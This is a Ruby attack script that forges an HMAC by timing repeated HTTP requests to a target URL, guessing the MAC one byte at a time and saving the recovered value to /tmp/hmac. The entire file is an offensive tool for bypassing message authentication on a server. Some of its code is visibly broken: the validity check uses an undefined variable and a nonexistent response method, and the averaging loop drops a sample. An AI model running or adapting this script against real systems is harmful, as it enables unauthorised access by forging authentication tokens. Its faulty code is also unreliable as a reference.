#! /usr/bin/env ruby

require 'net/http'
require 'uri'
require 'benchmark'
#
# Check arguments
#
if ARGV.size != 2
  puts "[+] HMAC Timing Discovery 2.0"
  puts "[+] Usage: #{__FILE__} <target url> <mac guess>"
  exit 1
end
#
# Setup
#
url      = ARGV[0]
base_mac = ARGV[1]
out_file = '/tmp/hmac'
N        = 20
#
# Store response time in a struct
#
ResponseTime = Struct.new(:mac, :time)
#
# Gets reponse time for a given URI
# 
# URI::HTTP -> Fixnum
#
def get_response_time(uri)
  Benchmark.realtime { Net::HTTP.get_response(uri) }
end
#
# Gets reponse time for a given URI
# 
# URI::HTTP -> Fixnum
#
def get_avg_response_time(uri, n)
  (0...n).reduce { |sum, _| sum += get_response_time(uri) } / (n.nonzero? || 1)
end
#
# Checks a supplied mac is valid
#
# HEX -> Boolean
#
def valid?(mac, url)
  Net::HTTP.get_response(uri).status_code == '200'
end
#
# ASCII -> HEX String
#
def ascii_s(hex_s)
  [hex_s].pack('H*')
end
#
# HEX -> ASCII String
#
def hex_s(ascii_s)
  ascii_s.unpack('H*')[0]
end
#
# Guess byte at given index
# 
# ASCII, HEX -> HEX
#
def guess_next_byte(url, mac)
  (0..255).reduce(ResponseTime.new(mac, 0)) { |result, byte|
    tmp_mac = mac + hex_s(byte.chr)
    t       = get_avg_response_time(URI.parse(url + tmp_mac), N)

    print "[+] Calculating..." + tmp_mac + "\r"
    
    if t > result.time
      puts t
      result.time = t
      result.mac  = tmp_mac
    end

    result
      
  }.mac
end
#
# MAIN
# 
puts "[+] Starting statistical timing attack...(this will take a while)"

valid_mac = ascii_s(base_mac).chars.reduce('') do |mac, char|
  sleep 0.5
  mac = guess_next_byte(url, mac)
end

puts "\n[+] Done"
puts "[+] Checking validity...."

if valid?(valid_mac, url)
  puts "[+] Success: #{valid_mac}"
  File.write(out_file, valid_mac)
else
  puts "[-] Error: server responded with non-success code"
end
